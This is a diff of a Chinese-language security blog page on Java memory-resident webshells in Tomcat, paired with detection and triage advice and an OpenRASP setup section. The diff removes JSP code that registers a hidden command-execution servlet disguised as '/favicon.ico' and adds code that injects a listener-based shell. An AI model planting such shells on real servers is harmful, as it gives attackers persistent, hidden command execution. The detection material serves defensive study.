-                    <span class="n">StandardEngine</span> <span class="n">engine</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
-                    <span class="k">try</span> <span class="o">{</span>
-                        <span class="n">engine</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardEngine</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">service</span><span class="o">,</span> <span class="s">"container"</span><span class="o">);</span>
-                    <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){}</span>
-                    <span class="k">if</span> <span class="o">(</span><span class="n">engine</span> <span class="o">==</span> <span class="kc">null</span><span class="o">){</span>
-                        <span class="n">engine</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardEngine</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">service</span><span class="o">,</span> <span class="s">"engine"</span><span class="o">);</span>
-                    <span class="o">}</span>
-
-                    <span class="n">children</span> <span class="o">=</span> <span class="o">(</span><span class="n">HashMap</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">engine</span><span class="o">,</span> <span class="s">"children"</span><span class="o">);</span>
-                    <span class="n">StandardHost</span> <span class="n">standardHost</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardHost</span><span class="o">)</span> <span class="n">children</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">serverName</span><span class="o">);</span>
-
-                    <span class="n">children</span> <span class="o">=</span> <span class="o">(</span><span class="n">HashMap</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">standardHost</span><span class="o">,</span> <span class="s">"children"</span><span class="o">);</span>
-                    <span class="n">Iterator</span> <span class="n">iterator</span> <span class="o">=</span> <span class="n">children</span><span class="o">.</span><span class="na">keySet</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span>
-                    <span class="k">while</span> <span class="o">(</span><span class="n">iterator</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()){</span>
-                        <span class="n">String</span> <span class="n">contextKey</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">iterator</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
-                        <span class="k">if</span> <span class="o">(!(</span><span class="k">this</span><span class="o">.</span><span class="na">uri</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="n">contextKey</span><span class="o">))){</span><span class="k">continue</span><span class="o">;}</span>
-                        <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">children</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">contextKey</span><span class="o">);</span>
-                        <span class="k">this</span><span class="o">.</span><span class="na">standardContext</span> <span class="o">=</span> <span class="n">standardContext</span><span class="o">;</span>
-                        <span class="k">return</span><span class="o">;</span>
-                    <span class="o">}</span>
-                <span class="o">}</span>
-            <span class="o">}</span>
-        <span class="o">}</span>
-        <span class="kd">public</span> <span class="n">StandardContext</span> <span class="nf">getSTC</span><span class="o">(){</span>
-            <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">standardContext</span><span class="o">;</span>
         <span class="o">}</span>
     <span class="o">}</span>
 
-    <span class="n">Tomcat6789</span> <span class="n">a</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Tomcat6789</span><span class="o">();</span>
-    <span class="n">StandardContext</span> <span class="n">standardCtx</span> <span class="o">=</span> <span class="n">a</span><span class="o">.</span><span class="na">getSTC</span><span class="o">();</span>
 <span class="o">%&gt;</span>
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="将恶意servlet封装成wrapper添加到standardcontext的children当中">将恶意servlet封装成wrapper添加到StandardContext的children当中</h2>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma" tabindex="0"><code class="language-java" data-lang="java"><span class="o">&lt;%</span>  
-    <span class="c1">// 用Wrapper对其进行封装  
-</span><span class="c1"></span>    <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">Wrapper</span> <span class="n">newWrapper</span> <span class="o">=</span> <span class="n">standardCtx</span><span class="o">.</span><span class="na">createWrapper</span><span class="o">();</span>  
-    <span class="n">newWrapper</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="s">"favicon.ico"</span><span class="o">);</span>  
-    <span class="n">newWrapper</span><span class="o">.</span><span class="na">setLoadOnStartup</span><span class="o">(</span><span class="n">1</span><span class="o">);</span>  
-    <span class="n">newWrapper</span><span class="o">.</span><span class="na">setServlet</span><span class="o">(</span><span class="n">servlet</span><span class="o">);</span>  
-    <span class="n">newWrapper</span><span class="o">.</span><span class="na">setServletClass</span><span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>  
-  
-    <span class="c1">// 添加封装后的恶意Wrapper到StandardContext的children中  
-</span><span class="c1"></span>    <span class="n">standardCtx</span><span class="o">.</span><span class="na">addChild</span><span class="o">(</span><span class="n">newWrapper</span><span class="o">);</span>  
 
-<span class="o">%&gt;</span>  
-  
-<span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>  
+<span class="o">&lt;%</span>
+    <span class="c1">// 获取servletContext, 因为servletContext是接口类，所以获取的是它子实现类ApplicationContextFacade
+</span><span class="c1"></span>    <span class="n">ServletContext</span> <span class="n">servletContext</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">getServletContext</span><span class="o">();</span>
+    <span class="c1">// 通过反射获取ApplicationContextFacade的私有属性context字段,类型ApplicationContext
+</span><span class="c1"></span>    <span class="n">Field</span> <span class="n">appctx_context</span> <span class="o">=</span> <span class="n">servletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"context"</span><span class="o">);</span>
+    <span class="c1">// 设置appctx 禁止Java语言访问检查
+</span><span class="c1"></span>    <span class="n">appctx_context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+    <span class="c1">// 通过反射获取字段值 - 获取字段appctx_context 在servletContext对象上的值，并强制类型转换ApplicationContext
+</span><span class="c1"></span>    <span class="n">ApplicationContext</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationContext</span><span class="o">)</span> <span class="n">appctx_context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletContext</span><span class="o">);</span>
+
+    <span class="c1">// 通过反射获取ApplicationContext的私有属性context字段，类型是StandardContext
+</span><span class="c1"></span>    <span class="n">Field</span> <span class="n">stdctx_context</span> <span class="o">=</span> <span class="n">applicationContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"context"</span><span class="o">);</span>
+    <span class="c1">// 设置stdctx_context 禁止Java语言访问检查
+</span><span class="c1"></span>    <span class="n">stdctx_context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+
+    <span class="c1">// 通过反射获取 stdctx_context 字段在 applicationContext类上对应的值，类型为Object，并强制转换为StandardContext
+</span><span class="c1"></span>    <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">stdctx_context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationContext</span><span class="o">);</span>
+
+
+    <span class="n">ListenerShell</span> <span class="n">servletRequestListener</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ListenerShell</span><span class="o">();</span>
+    <span class="n">standardContext</span><span class="o">.</span><span class="na">addApplicationEventListener</span><span class="o">(</span><span class="n">servletRequestListener</span><span class="o">);</span>
+    <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"inject success"</span><span class="o">);</span>
+
+<span class="o">%&gt;</span>
+<span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
 <span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="添加servletmapping将访问的url和wrapper进行绑定">添加ServletMapping将访问的URL和wrapper进行绑定</h2>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma" tabindex="0"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma" tabindex="0"><code class="language-java" data-lang="java"><span class="o">&lt;%</span>
-	  
-    <span class="c1">// 添加ServletMapping到将访问的URL和Servlet进行绑定  
-</span><span class="c1"></span>    <span class="n">standardCtx</span><span class="o">.</span><span class="na">addServletMappingDecoded</span><span class="o">(</span><span class="s">"/favicon.ico"</span><span class="o">,</span><span class="s">"favicon.ico"</span><span class="o">);</span>  
-
-<span class="o">%&gt;</span>
-
-</code></pre></td></tr></table>
-</div>
-</div><p>执行上述代码后，访问当前应用的/shell路径，加上cmd参数就可以命令执行了。</p>
-<h1 id="内存马检测与排查">内存马检测与排查</h1>
+</div><h1 id="内存马检测与排查">内存马检测与排查</h1>
 <h2 id="源码检测">源码检测</h2>
 <p>在Java中，只有被JVM加载/或在需要时通过反射通知JVM加载的类才能被调用。所有的特征都在内存中，表现形式为被加载的class，需要通过某种方法获取到JVM运行时内存中已加载的类。<br/>
 Java本身提供了Instrumentation类来实现<br/>
@@ -2839,8 +2674,58 @@ Java本身提供了Instrumentation类来实现<br/>
 如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法<br/>
 如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。<br/>
 如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200</p>
+<h3 id="arthashttpsarthasaliyuncomarthas-bootjar-排查"><a href="https://arthas.aliyun.com/arthas-boot.jar" target="_blank">Arthas</a> 排查</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash">java -jar arthas-boot.jar
+sc *servlet
+jad --source-only com.example.xxx
+</code></pre></td></tr></table>
+</div>
+</div><p></p><p class="md__image">
+<img alt="" src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220722151710.gif"/>
+</p>
 <h1 id="整体演示">整体演示</h1>
 <p>“http://{ip}:{port}/{war包名称}/{访问的默认首页}”</p>
+<p></p><p class="md__image">
+<img alt="" src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220721181313.gif"/>
+</p>
+<h1 id="打包部署到tomcat">打包部署到Tomcat</h1>
+<p></p><p class="md__image">
+<img alt="" src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220720194934.gif"/>
+</p>
+<h2 id="centos安装tomcat">Centos安装Tomcat</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash">yum -y install tomcat 
+systemctl start/stop/status  tomcat
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>安装路径： <code>/usr/share/tomcat</code></li>
+<li>配置路径:：<code>/etc/tomcat/</code></li>
+<li>排错日志： <code>/usr/share/tomcat/logs/catalina.*.log</code></li>
+</ul>
+<h2 id="部署war包">部署war包</h2>
+<p>上传war包到<code>/usr/share/tomcat/webapps</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash">scp TomcatServletShell-1.0-SNAPSHOT.war  rasp:/usr/share/tomcat/webapps 
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="配置openrasp">配置openrasp</h2>
 <div class="hugo-encryptor-container">
 <div class="hugo-encryptor-prompt">
 <p>文章的部分内容被密码保护：</p>
@@ -2849,21 +2734,21 @@ Java本身提供了Instrumentation类来实现<br/>
 <input class="hugo-encryptor-input" placeholder="请输入密码"/>
 <input class="hugo-encryptor-button" onclick="_click_handler(this)" type="button" value="点击验证"/>
 </div>
-<div class="hugo-encryptor-cipher-text" style="display: none;">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